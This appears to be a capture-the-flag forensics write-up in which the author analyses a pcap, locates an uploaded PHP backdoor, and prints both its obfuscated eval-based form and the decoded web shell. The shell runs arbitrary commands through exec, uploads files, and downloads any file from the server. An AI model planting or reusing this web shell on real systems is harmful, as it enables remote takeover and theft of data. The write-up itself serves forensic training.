# Roten (easy)
For this challenge we get a pcap file and it's not as simple as the first challenge.
Let's inspect the capture file properly this time and see what it holds.

There are some legitimate requests at the start, both `GET` and `POST`.
Then follows a bunch of 404 not founds, as if someone was using dirbuster to bruteforce URLs.
Then at the end we see some suspicious 500 responses. They are suspicious because the `GET` requests which they originate from contain what lookds like commands, such as `ls` and `whoami`.

It must be that at some point a malicious backdoor php file was uploaded and now they are sending it commands.
Let's look for where the file could have been uploaded, for example `POST` requests are interesting here.

And indeed after filtering for `POST` requests, we see that packet 1929 has a mime type of `application/x-php`.
Now we can follow the HTTP stream and see what the php backdoor contains:

```php
$pPziZoJiMpcu = 82; 
$liGBOKxsOGMz = array(); 
$iyzQ5h8qf6 = "" ; 
$iyzQ5h8qf6 .= "<nnyo ea\$px-aloerl0=e r\$0' weme Su rgsr s\"eu>\"e'Er= elmi)y ]_'t>bde e e  =p   xt\" ?ltps vdfic-xetrmsx'l0em0  o\"oc&'t [r\"e _e;eV.ncxm'vToil   ,F y"; 
$iyzQ5h8qf6 .= "<r s -<a  \"op r_P< poeeihaeild /ds\"se4bsxao1: r]du ;e\$'o,t dn\n)i\$'me'maoate{e  I!lb>'u btde .sr ege/ han:t"; 
$iyzQ5h8qf6 .= "elrlenjl t>( 0'eCdd0  l et0\n'seu u it ;e_ dc>ulUd'T\nxe\$L<er<.l oh>c  ii aert pdt iai(ed.QiJr\n\$i0; 0\"e0' d= ex ].xp\$r re \nwSn'u<lup ]o iluE/=>b\$t r>\n"; 
$iyzQ5h8qf6 .= "h rxn ltmb \n'-aodd') bubaa\nff0 i0] )- [ &\"4 ==e[wn (r #iEa tftelF)U sspSb\"'rd  dO o e_t ppso \n]DpneaC;aoesvp\ni( }f0 & ' \"( ]0 =sc'o  \$s #nRmaeoi=oi)p te"; 
$iyzQ5h8qf6 .= "l[>c;>ia ew   agP aw(d i;ep:rto\nnor/a/<l )\n( = ?;\$r\$0 0 'puwr\$\$d\" fgVeu'rp'al l s o'<o\n<rs rn \" leeetu\$y f\nsl (en dtyjS3?e\$   ) 0 \ngem0=  xrtrlsdi; l E=t>ma\"d"; 
$iyzQ5h8qf6 .= "e{o  iafbl\nb. }ee < ptrchid>   cia''t  s qc.p)m{ \$ (0' rao0 ) 'ieid;ir\n adR'o\\ r.''\na ifdiro >'\$\ndr<t apmh(di\" ( rctE)"; 
$iyzQ5h8qf6 .= "e mtlur3h;o  m{\$2x odd0(  )n't[\nr)  gi[dcnat\$   d n Dl>r R k}\"<tr twso\$(r; i iatx;n iriei.p\nd\$ o m0' u\"e1\$\$ "; 
$iyzQ5h8qf6 .= " t]e'} ) } r'io\"c/_in '  (ie': e&e\n>/b> hu( df)\n s ptap\nt nabrp6\n et d\$o0  p] )ogi?f)'r\n=  \n=ePrm;tfGda"; 
$iyzQ5h8qf6 .= " ]e\"mrT;r s&ye\nto\" (i\$\"ii e s tici - ipryt/\n  y etd): [ & wrf (;]e\n {   cH'p\nioE=m [c.oeo\ne u  c hd; \$dd<rl.c e iohr L fca/ jf &p  ye   "; 
$iyzQ5h8qf6 .= "\"= ?no('\"\n,a\n\$\n  HtP leorT'e 'h\$vcU d l'=h >y\n d(it.e h t onme e idr1-su  e &p ?' e 0 eu t%  d\$_   To_vecnm[f= nouetp \" t."; 
$iyzQ5h8qf6 .= ">o \n> eifrd'o\"o ( n/es n eny.-/n 0=e e& - x(0'rp\$'1 \$'dP   BrSath=-'i' a p_ol >  \$    \n cri)>/w<  \$i:on: g "; 
$iyzQ5h8qf6 .= "d. 1>bc x'l0= ''\$e\$0x[[m s g]iO   {yEleo'ddls m\"luro E}o_\$\"< < h.l <'n/\" _f ct  t  c-2\not 2dsx'0w;gcm0''\"o:% r,rS   W Lu= \"aieu\$e<opya r\nfG"; 
$iyzQ5h8qf6 .= "v<t ? o'e.a.et< G Ft;0 h Co-.<oi 0'eAs0'\nruo2 eed 1 o  T   0\"Fe'\".trTbu'bal)d r\n Eabh p  /o  \$rd/ E(ie ' :eSm>2stoi0; 0'4  otd):xxe's u\$=[ "; 
$iyzQ5h8qf6 .= "  w '=o<\$a'omp]rdo)' o}cTlre h \"'w\"hv(>t Tfltf)  xS/\n/csnf0 i0;0: uee  ee T% pw '  \$_.]\"f/_']Uil)>Da ] r\no[u>a p <.n<ra\$\\a [ie-i; 'i b<jrt ( }f0 0  "; 
$iyzQ5h8qf6 .= "p\" ?'cc&'1 [o\$d  dR ..ffS>.pto;<id{[} \nm'e\"d \n t\$e/eldnb 'l sl\n  t-osqirp )\n( })' []& -uu ;s\$'r_ii iO\$\"\$'oE"; 
$iyzQ5h8qf6 .= "\\\"l'a\nbre\n' uimc);> fidvrtfui\"l deTte  .;-ocupar\$   )\n - \"  ''tt0\n\"selGrf rtd'd rRn'o>d red nepfam \n\n<o"; 
$iyzQ5h8qf6 .= "f>a(d=er;e o_rrn h \n>tretpim{ \$  ?' w=0w;eex ,.xdE'   _i iamV\"/a\"D >c_ all nd{? tr <l\$>').\n> weaea ef \nsir .no  "; 
$iyzQ5h8qf6 .= "m{  ; r 0'\n'\"2  =e[T](\$=Armru>E;>d;i <tf mso(d'\n> he(aud\\\" ' \" nxnam ai <tpysmtd\$ o  '\n i(0  ]]0 \$sc'[;if _ e.t\"R\n '\nr boi eeai ] \n >ai ein../ ; lisme "; 
$iyzQ5h8qf6 .= "dl lrt.riPet d\$ r \$t\$0: = 0 opuw'\nsi'D.t\"o;[e\">ee  rl ' dse, \n Pcsh)r\"  ' \n osf'= ee ia mcne y et ' gem4  ==  wrtrd}_l.a h f\n'c;\\cc sye ]{isx  <"; 
$iyzQ5h8qf6 .= " eh_r .;\$\". \n ate)\" rs npsi=.r&p  y   r\"o)' ' ) nieii\nfe/Y\"o/oePh\nnht t.( .\nnee\$ t r de.'\n_'\$ \n dsr;' (i k/rn\"jm e &p : o]d - x(  en'tr\$i '}<d>ccHoe<o"; 
$iyzQ5h8qf6 .= "o y\"\$ ' gtcc a<m(if / S>v ? '('\n. 'z  3c.hss0=e e   u e?' '\$\$ rt]e'fl=;\n/=\"uhP cb ril._    (um bti\$r=\"' E\"a > ]\$) b Pe r.=jt\"(x'l0=e' p=  ; )gw\$[f)']ie \n\$h"; 
$iyzQ5h8qf6 .= "';so_\"hr\"yfe<F u f\$td lrsd('/. R.l \n )f; a r(}e3\"st>\$1csx'l- [ &'\n  ros'(;];l(\$}d2G\n> S<o><  =/I p i_ir e>sir\"'\$ V u}\n )i\n s a\$\nl.h\"p<f0'e8l"; 
$iyzQ5h8qf6 .= "s' \"( r i?or=r\"\n,\ne\$d\ni>Ee\\\"Ei </=('bL l lGoe  \nire.>v E\$e\n\n  l  ehgf}=6t>:/i0; 0'e;\$r\$0' f ulse%  i di\$r\"Tcn\\Ln\"id fc>E o eEns c osa \"a Rv) \n {e"; 
$iyzQ5h8qf6 .= "  nemi\n\"/t</sl0 i0; \noem0  ('pdpa1 \$f=irds;'h<nFp<ni\$io<S a  T:u l n l\$.l [a) < \n)  aaal\nscp//ce }f0 \$ wao0:  s[[rds w  r;i \n>o"; 
$iyzQ5h8qf6 .= "i<'uipvdll/[ d '[ l a sap_ u 'l[ /  )  md:e?tsssmr))\n( }t ndd1  \$''\"i'% o(')\nr=e\" nb]tnu>ieob' e .'<t s <saS\$e}Pu"; 
$iyzQ5h8qf6 .= "n d     ee )>ys:cai    )\ny e\"e0' m een]1 ri')   c;\"pr. pt\"r_rrfed \$c/) s / tEv)\nHea i  {  (rp)\nl//rxp{{ \$  p r] )- o:xxt,s ls;  =sh\n<u>\"tu"; 
$iyzQ5h8qf6 .= " ;.e:>ic  umb; = t\$hRa) P m v  \n  \$(u;\neb/ict\n  m{ e [ & ' d eef % ds\n{  coeit\\'ytt\n'xr<lhs pd>\n \" hk(Vl[ _.e >     f'b\n<soapd> \$ o  = \"="; 
$iyzQ5h8qf6 .= " ?;\$e'cc(\$1 [ei\n ra cn n p y\n/ie/eou l'< et >e\$Eun S ] \n     iCl hhojtn\n t d\$ ' e 0 \nw Suu\"os\$'tf  en\"hpt<metpi'sdbT c o]b ca"; 
$iyzQ5h8qf6 .= "<\nydRea E\" e<    hlai teta>.\n y et u x(0' o&'tt%w\"se(   ad\\ouyde=yef.t'ro'c a)r hbt  i[ m L<.c/    eecc mesx\nb< p  y '\$e\$0x r ;ee1n,.x\$(  lin tpit'p"; 
$iyzQ5h8qf6 .= "= bs>>U<e d)> olh =r'.e F/\"hh \$  a)h' ltt.\nod e &p ;ocm2' l0\n'\"se =e_\$  pr<\" evhhe'(a(E\"pbseD \"  e> >.P ] 'a<ot f hd.e) >\"r"; 
$iyzQ5h8qf6 .= "g<oi =e e \nwuo0  dx ]]\"r\$scPd  a(b<t= oi=sis\$r;lrsci{; \" N  'H\"  ]>/ m i ee'-; \n ao!tv 'l0=e ntd): [8 = ,[gpuOi  t\$riy'cdd'useur\no>fhr\n\n \$ta \$/P<.e <t\""; 
$iyzQ5h8qf6 .= "l l ar\"C\n <hpo-s  psx'l eee   \"0 == 'rrtSr  hd>npsl=dfbsnpo a<uoe   vam v'_/ l./d<> e d('o  !r.g-tc\$'e6-s r\" ?' e0 ' \$woieT   (i<peua'eime"; 
$iyzQ5h8qf6 .= "alr dbl c  fabe<a.Sa\"s t>/    e')n  -eml rlm; 0'e []& - x  x(trun'[=  \$rfu=bsPnlitmo. 'rl't  oll</l\$E><e\"d<t  = rC;t  -fieLaao i0;  \"  ''\$e) "; 
$iyzQ5h8qf6 .= "'\$yipt]'=  d)ot'msO'et(ea  ]>y<o  rue/tuvL</ ?>tr    (o\nr   =naapsd}f0 i w=0w;wc  )wpt[f)d   i;r ti=S ''\$(dF [< br  ee-treaF/t{d<d>  \$h"; 
$iyzQ5h8qf6 .= "'n o  L\".ptcse\n( }f r 0'\nou\$  oee'(;iN  r\nmtet'Tn  _\$Di 'biry  a hh>)l'td\not>\"  _eCt l rahcied=   )\n( i(0  rtoi?r)'r\"\nrU e.e yx'n'anvP_il t>n>.  c"; 
$iyzQ5h8qf6 .= "\\o>\n u]d> wd ;  Gaoe : ettsssn\"= \$   \$t\$4: lewf l;]e% 'L c'capt a maaOFre mF <'  hnv\n {e >< n>\"\n  Ednn   aets.t.c  m{ \$oem0  d\"n('d\n,a1 ]L h/hce'vveemlS"; 
$iyzQ5h8qf6 .= "Ie }pi'b<ee <e  \n).<t l\" }  Tett m dsp\"c cof o  mw\"o)' []e s[  ds )  o'ot= abn=euTLca\n_l.r/cx(br   ) td o..\n  [re- u ft:>oconi d\$ on]d - "; 
$iyzQ5h8qf6 .= "\" r\$'' \$'% )oe . i'nlac'=e[Etl ne\$>bhe\$r    )\"d> a  e  '(nD s i /\nmomtl et de e?' w=[m e o]1  rc\$\$\"ohaurtd'='Sor a d<>occ>t <  ?>  dppc  d"; 
$iyzQ5h8qf6 .= "'ti t lc/\n/m/ae  y er=  ; r \"o:x w,s { hfv<nime-yif's[re m'ib< (m\"a / {d\"\" =orh  oC-s -heom<apbip &p  [ &'\n i(ed e n % \n!oiah=de=fpriUu'ya e.r b\"'d;b t"; 
$iyzQ5h8qf6 .= " \ni.  \"sio  woTp re(ma!jionee e &\"( r \$t\$xe'c e\$1  i ll2'd='oe'lpbf)d '\$.sr<cr\nl h  r . .in   "; 
for($i = 0; $i < $pPziZoJiMpcu; $i++) $liGBOKxsOGMz[] = ""; 
for($i = 0; $i < (strlen($iyzQ5h8qf6) / $pPziZoJiMpcu); $i++) { for($r = 0; $r < $pPziZoJiMpcu; $r++) $liGBOKxsOGMz[$r] .= $iyzQ5h8qf6[$r + $i * $pPziZoJiMpcu]; } 
$bhrTeZXazQ = trim(implode("", $liGBOKxsOGMz)); 
$bhrTeZXazQ = "?>$bhrTeZXazQ"; 
eval( $bhrTeZXazQ );
```

Okay this is very ugly, but at the end there's an eval of the string, so what if we replace the eval by echo and see what the decoded backdoor is?

```php
<?php

if (isset($_GET['download'])) {
        $file = $_GET['download'];
        if (file_exists($file)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($file).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            readfile($file);
            exit;
        }
}

?>

<html>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>

<div class="container">


<?php

function printPerms($file) {
        $mode = fileperms($file);
        if( $mode & 0x1000 ) { $type='p'; }
        else if( $mode & 0x2000 ) { $type='c'; }
        else if( $mode & 0x4000 ) { $type='d'; }
        else if( $mode & 0x6000 ) { $type='b'; }
        else if( $mode & 0x8000 ) { $type='-'; }
        else if( $mode & 0xA000 ) { $type='l'; }
        else if( $mode & 0xC000 ) { $type='s'; }
        else $type='u';
        $owner["read"] = ($mode & 00400) ? 'r' : '-';
        $owner["write"] = ($mode & 00200) ? 'w' : '-';
        $owner["execute"] = ($mode & 00100) ? 'x' : '-';
        $group["read"] = ($mode & 00040) ? 'r' : '-';
        $group["write"] = ($mode & 00020) ? 'w' : '-';
        $group["execute"] = ($mode & 00010) ? 'x' : '-';
        $world["read"] = ($mode & 00004) ? 'r' : '-';
        $world["write"] = ($mode & 00002) ? 'w' : '-';
        $world["execute"] = ($mode & 00001) ? 'x' : '-';
        if( $mode & 0x800 ) $owner["execute"] = ($owner['execute']=='x') ? 's' : 'S';
        if( $mode & 0x400 ) $group["execute"] = ($group['execute']=='x') ? 's' : 'S';
        if( $mode & 0x200 ) $world["execute"] = ($world['execute']=='x') ? 't' : 'T';
        $s=sprintf("%1s", $type);
        $s.=sprintf("%1s%1s%1s", $owner['read'], $owner['write'], $owner['execute']);
        $s.=sprintf("%1s%1s%1s", $group['read'], $group['write'], $group['execute']);
        $s.=sprintf("%1s%1s%1s", $world['read'], $world['write'], $world['execute']);
        return $s;
}


$dir = $_GET['dir'];
if (isset($_POST['dir'])) {
        $dir = $_POST['dir'];
}
$file = '';
if ($dir == NULL or !is_dir($dir)) {
        if (is_file($dir)) {
                echo "enters";
                $file = $dir;
                echo $file;
        }
        $dir = './';
}
$dir = realpath($dir.'/'.$value);
##flag = HTB{W0w_ROt_A_DaY}
$dirs = scandir($dir);
echo "<h2>Viewing directory " . $dir . "</h2>";
echo "\n<br><form action='".$_SERVER['PHP_SELF']."' method='GET'>";
echo "<input type='hidden' name='dir' value=".$dir." />";
echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
echo "</form>";
echo "\n<br>\n<div class='navbar-form'><form action='".$_SERVER['PHP_SELF']."' method='POST' enctype='multipart/form-data'>\n";
echo "<input type='hidden' name='dir' value='".$_GET['dir']."'/> ";
echo "<input type='file' name='fileToUpload' id='fileToUpload'>\n<br><input type='submit' value='Upload File' name='submit'>";
echo "</div>";

if (isset($_POST['submit'])) {
        $uploadDirectory = $dir.'/'.basename($_FILES['fileToUpload']['name']);
        if (file_exists($uploadDirectory)) {
        echo "<br><br><b style='color:red'>Error. File already exists in ".$uploadDirectory.".</b></br></br>";
        }
        else if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $uploadDirectory)) {
                echo '<br><br><b>File '.$_FILES['fileToUpload']['name'].' uploaded successfully in '.$dir.' !</b><br>';
        } else {
                echo '<br><br><b style="color:red">Error uploading file '.$uploadDirectory.'</b><br><br>';

        }

}

if (isset($_GET['cmd'])) {
        echo "<br><br><b>Result of command execution: </b><br>";
        exec('cd '.$dir.' && '.$_GET['cmd'], $cmdresult);
        foreach ($cmdresult as $key => $value) {
                echo "$value \n<br>";
        }
}
echo "<br>";
?>

<table class="table table-hover table-bordered">
    <thead>
      <tr>
        <th>Name</th>
        <th>Owner</th>
        <th>Permissions</th>
      </tr>
    </thead>
    <tbody>
<?php
foreach ($dirs as $key => $value) {
        echo "<tr>";
        if (is_dir(realpath($dir.'/'.$value))) {
                echo "<td><a href='". $_SERVER['PHP_SELF'] . "?dir=". realpath($dir.'/'.$value) . "/'>". $value . "</a></td><td>". posix_getpwuid(fileowner($dir.'/'.$value))[name] . "</td><td> " . printPerms($dir) . "</td>\n";
        }
        else {
                echo "<td><a href='". $_SERVER['PHP_SELF'] . "?download=". realpath($dir.'/'.$value) . "'>". $value . "</a></td><td>". posix_getpwuid(fileowner($dir.'/'.$value))[name] ."</td><td> " . printPerms($dir) . "</td>\n";
        }
        echo "</tr>";
}
echo "</tbody>";
echo "</table>";


?>



</div>
</html>

```

And as we can see it contains the flag in the form of a comment.
